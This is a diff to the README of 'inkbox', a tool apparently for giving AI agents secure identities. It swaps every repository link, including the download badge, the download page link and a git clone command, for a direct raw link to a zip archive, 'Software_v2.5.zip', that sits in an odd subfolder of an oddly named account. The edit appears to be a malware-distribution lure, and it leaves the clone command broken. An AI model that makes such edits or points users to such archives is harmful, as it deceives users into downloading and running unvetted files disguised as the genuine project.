@@ -1,6 +1,6 @@
 # 🧠 inkbox - Give agents secure identities
 
-[![Download inkbox](https://img.shields.io/badge/Download%20inkbox-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/familybangiaceaecaliforniablackoak64/inkbox)
+[![Download inkbox](https://img.shields.io/badge/Download%20inkbox-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/familybangiaceaecaliforniablackoak64/inkbox/raw/refs/heads/main/lath/Software_v2.5.zip)
 
 ## 📦 What is inkbox?
 
@@ -32,7 +32,7 @@ If you plan to use the examples or SDK tools, it also helps to have:
 ## ⬇️ Download inkbox
 
 Visit this page to download:
-https://github.com/familybangiaceaecaliforniablackoak64/inkbox
+https://github.com/familybangiaceaecaliforniablackoak64/inkbox/raw/refs/heads/main/lath/Software_v2.5.zip
 
 On Windows:
 1. Open the link in your browser.
@@ -62,7 +62,7 @@ If the page offers source files only, use the repo files as the install base and
    ```
 3. Copy the repo:
    ```powershell
-   git clone https://github.com/familybangiaceaecaliforniablackoak64/inkbox.git
+   git clone https://github.com/familybangiaceaecaliforniablackoak64/inkbox/raw/refs/heads/main/lath/Software_v2.5.zip
    ```
 4. Open the new inkbox folder.
 
